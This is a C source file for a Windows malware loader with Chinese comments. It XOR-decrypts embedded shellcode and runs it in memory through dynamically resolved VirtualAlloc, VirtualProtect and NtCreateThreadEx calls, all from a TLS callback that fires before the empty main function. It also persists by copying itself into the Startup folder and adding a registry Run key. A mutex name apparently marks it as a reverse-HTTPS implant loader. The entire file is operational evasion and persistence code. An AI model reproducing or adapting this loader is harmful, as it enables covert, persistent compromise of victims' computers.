#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <shlwapi.h>
#include <tchar.h>
#include "enc_shellcode.h"

// XOR 解密函数
void decrypt(unsigned char *data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 设置自启：复制到 Startup 并写入注册表 Run 键
void setup_persistence() {
    char src[MAX_PATH], dst[MAX_PATH], appdata[MAX_PATH];

    // 获取自身路径
    GetModuleFileNameA(NULL, src, MAX_PATH);
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);

    // 拼接启动路径
    snprintf(dst, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\123.exe", appdata);

    // 如果目标不存在，则复制过去
    if (GetFileAttributesA(dst) == INVALID_FILE_ATTRIBUTES) {
        CopyFileA(src, dst, FALSE);
    }

    // 写注册表项 (开机启动)
    HKEY hKey;
    if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyLoader123", 0, REG_SZ, (BYTE*)dst, (DWORD)(strlen(dst) + 1));
        RegCloseKey(hKey);
    }
}

// 动态解析 API
FARPROC resolve(LPCSTR dll, LPCSTR func) {
    HMODULE h = LoadLibraryA(dll);
    if (!h) return NULL;
    return GetProcAddress(h, func);
}

// TLS Callback
void NTAPI tls_callback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason != DLL_PROCESS_ATTACH) return;

    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\OnlyOneReverseHTTPSLoader2025");
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        ExitProcess(0);
    }

    setup_persistence();  // 复制自身并写入注册表

    decrypt(shellcode, shellcode_len, 0x5C);

    LPVOID(WINAPI * pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
        (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))resolve("kernel32.dll", "VirtualAlloc");

    BOOL(WINAPI * pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD) =
        (BOOL(WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD))resolve("kernel32.dll", "VirtualProtect");

    NTSTATUS(WINAPI * pNtCreateThreadEx)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE,
        LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID) =
        (NTSTATUS(WINAPI *)(
            PHANDLE, ACCESS_MASK, PVOID, HANDLE,
            LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
        ))resolve("ntdll.dll", "NtCreateThreadEx");

    LPVOID addr = pVirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) {
        while (1) Sleep(1000);
    }

    memcpy(addr, shellcode, shellcode_len);

    DWORD old = 0;
    pVirtualProtect(addr, shellcode_len, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = NULL;
    pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, (HANDLE)-1,
        (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        CloseHandle(hThread);
    }

    while (1) Sleep(1000);
}

// TLS 注册
#ifdef _MSC_VER
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback")
#else
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK _tls_callback = tls_callback;
#endif

int main() {
    return 0;
}
